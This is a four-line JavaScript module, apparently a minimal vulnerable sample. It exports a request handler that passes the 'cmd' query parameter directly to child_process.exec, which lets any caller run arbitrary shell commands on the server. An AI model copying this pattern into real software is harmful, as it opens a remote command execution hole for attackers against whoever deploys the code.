import * as child_process from "node:child_process";
export function handler(req) {
  child_process.exec(req.query.cmd);
}
